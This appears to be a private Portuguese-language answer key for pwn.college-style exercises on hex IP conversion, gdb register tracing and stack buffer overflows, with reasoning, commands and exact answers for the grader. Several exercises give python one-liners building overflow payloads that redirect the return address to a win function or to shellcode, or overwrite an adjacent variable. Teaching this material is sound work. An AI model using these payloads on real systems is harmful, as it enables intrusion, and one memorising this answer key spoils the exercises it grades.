# GABARITO (privado, NAO versionar no repo publico)

Para cada exercicio: o raciocinio (como o aluno chega em cada valor), o comando
pronto, a entrada pronta e a saida pronta. Rode no terminal do pwn.college
(usuario hacker). O que o /challenge/check corrige e sempre o ~/resposta.txt;
reescreva esse arquivo antes de cada check.

---

## Exercicio 1 - log-firewall

Como chegar:
Cada IP do log tem 4 bytes em hex, 1 byte por octeto. Converta cada par hex em
decimal. A rede interna 192.168.10.0/24 fixa os 3 primeiros octetos em
192.168.10; o 4o octeto e livre. Quem nao tiver exatamente 192.168.10 nos tres
primeiros octetos esta fora.
- C0 A8 0A 2D = 192.168.10.45  -> INTERNO
- C0 A8 0B 05 = 192.168.11.5   -> terceiro octeto 11, nao 10 -> EXTERNO (armadilha)
- 0A 00 00 0F = 10.0.0.15       -> EXTERNO
- C0 A8 0A FE = 192.168.10.254 -> INTERNO
Linha 5: o 192.168.x.x EXTERNO e o 192.168.11.5, em binario:
192=11000000, 168=10101000, 11=00001011, 5=00000101.

Comando pronto:
```bash
cat > ~/resposta.txt <<'END'
192.168.10.45 INTERNO
192.168.11.5 EXTERNO
10.0.0.15 EXTERNO
192.168.10.254 INTERNO
11000000.10101000.00001011.00000101
END
/challenge/check
```

---

## Exercicio 2 - gdb-registradores

Como chegar:
No nop: mov rax,0x1122334455667788 carrega RAX; push rax poe esse valor no topo
da pilha ([rsp]); mov rax,0x2A troca RAX para 0x2A; mov rdx,0x3C7 poe 0x3C7 em
RDX. Logo RAX=0x2A, RDX=0x3C7, [rsp]=0x1122334455667788.

Montar e ligar:
```bash
cat > reg.asm <<'END'
global _start
section .text
_start:
    mov   rax, 0x1122334455667788
    push  rax
    mov   rax, 0x2A
    mov   rdx, 0x3C7
    nop
    pop   rax
    mov   rax, 0x3C
    xor   rdi, rdi
    syscall
END
nasm -f elf64 reg.asm -o reg.o
ld reg.o -o reg
```

No gdb (break _start marca o inicio, run para nele, stepi 4 anda ate o nop):
```bash
gdb ./reg
```
```
break _start
run
stepi 4
info registers rax rdx
x/gx $rsp
quit
```
Saida do gdb: rax = 0x2a, rdx = 0x3c7, [rsp] = 0x1122334455667788

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
0x2A
0x3C7
0x1122334455667788
END
/challenge/check
```

---

## Exercicio 3 - gdb-rastreio

Como chegar:
xor rax,rax zera RAX; mov rdi,0x14 poe 20 em RDI. A funcao dobro faz RAX=rdi e
shl rax,1 (multiplica por 2 = 40 = 0x28) e retorna. Entao:
- (A) antes do call: RAX = 0x0
- (B) depois do ret: RAX = 0x28
- (C) depois do add rax,0x7: 0x28 + 0x7 = 0x2F

Montar e ligar:
```bash
cat > rastreio.asm <<'END'
global _start
section .text
_start:
    xor   rax, rax
    mov   rdi, 0x14
    call  dobro
    add   rax, 0x7
    mov   rax, 0x3C
    xor   rdi, rdi
    syscall
dobro:
    mov   rax, rdi
    shl   rax, 1
    ret
END
nasm -f elf64 rastreio.asm -o rastreio.o
ld rastreio.o -o rastreio
```

No gdb (break _start + run param no inicio; stepi 2 para no call; nexti passa
POR CIMA da chamada, nao use stepi aqui senao entra na funcao):
```bash
gdb ./rastreio
```
```
break _start
run
stepi 2
info registers rax
nexti
info registers rax
nexti
info registers rax
quit
```
Saida do gdb: 0x0 (antes do call), 0x28 (depois do ret), 0x2f (depois do add)

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
0x0
0x28
0x2F
END
/challenge/check
```

---

## Exercicio 4 - buffer-overflow-1

Como chegar:
buf[32] fica em rbp-0x20. Do inicio de buf ate o RBP salvo sao 0x20 = 32 bytes;
mais 8 bytes (o RBP salvo) chega ao endereco de retorno. Enchimento ate o
retorno = 32 + 8 = 40 bytes. Enviando 40 bytes 0x41 ('A') e 8 bytes 0x42 ('B'),
os 8 'B' caem exatamente no endereco de retorno; no ret, o RIP vira
0x4242424242424242 (0x42 = 'B', oito vezes).

Ver no gdb (opcional): gere a entrada e rode o binario parando no ret da funcao
vulneravel para ver o RIP:
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'B'*8)" > /tmp/p4
# gdb /challenge/overflow1 ; break na funcao vulneravel ; run < /tmp/p4 ;
# siga ate o ret e: info registers rip
```

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
32
40
0x4242424242424242
END
/challenge/check
```

---

## Exercicio 5 - buffer-overflow-2

Como chegar:
Mesmo principio, buffer maior. buf[128] em rbp-0x80. Enchimento ate o retorno =
0x80 + 8 = 128 + 8 = 136 bytes. Enviando 136 bytes 0x41 ('A') e 8 bytes 0x43
('C'), o RIP no ret vira 0x4343434343434343 (0x43 = 'C', oito vezes).

Ver no gdb (opcional):
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*136 + b'C'*8)" > /tmp/p5
```

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
128
136
0x4343434343434343
END
/challenge/check
```

---

## Exercicio 6 - controlar-rip

Como chegar:
buf[48] em rbp-0x30. Enchimento ate o retorno = 0x30 + 8 = 48 + 8 = 56 bytes.
A funcao win esta em 0x401205. Em vez de lixo, ponha o endereco de win no
retorno, em little-endian (bytes do mais baixo ao mais alto, completando 8):
0x401205 -> 05 12 40 00 00 00 00 00. Depois do ret, o RIP vira 0x401205.

Ver no gdb (opcional):
```bash
python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*56 + struct.pack('<Q',0x401205))" > /tmp/p6
```

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
56
05 12 40 00 00 00 00 00
0x401205
END
/challenge/check
```

---

## Exercicio 9 - rip-shellcode

Como chegar:
buf[64] em rbp-0x40. Enchimento ate o retorno = 0x40 + 8 = 64 + 8 = 72 bytes.
O programa vaza o endereco do buf (buf @ 0x7fffffffe2a0). Ponha o shellcode no
inicio do buf, encha ate o retorno e escreva o endereco do buf no retorno: o RIP
cai no inicio do shellcode. Endereco a usar: 0x7FFFFFFFE2A0. Em little-endian:
A0 E2 FF FF FF 7F 00 00.

Ver no gdb (opcional):
```bash
python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*72 + struct.pack('<Q',0x7fffffffe2a0))" > /tmp/p9
```

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
72
0x7FFFFFFFE2A0
A0 E2 FF FF FF 7F 00 00
END
/challenge/check
```

---

## Exercicio 10 - variavel-adjacente

Como chegar:
buf[24] em rbp-0x20 e a variavel chave em rbp-0x08. Como chave fica num endereco
mais alto que buf, o transbordo de buf alcanca chave. Distancia de buf ate
chave = 0x20 - 0x08 = 0x18 = 24 bytes. Escreva 24 bytes de enchimento e, logo
depois, o valor que o if exige (chave == 0x1337), em little-endian:
0x1337 em 4 bytes -> 37 13 00 00.

Ver no gdb (opcional):
```bash
python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*24 + struct.pack('<I',0x1337))" > /tmp/p10
```

Resposta e check:
```bash
cat > ~/resposta.txt <<'END'
24
0x1337
37 13 00 00
END
/challenge/check
```
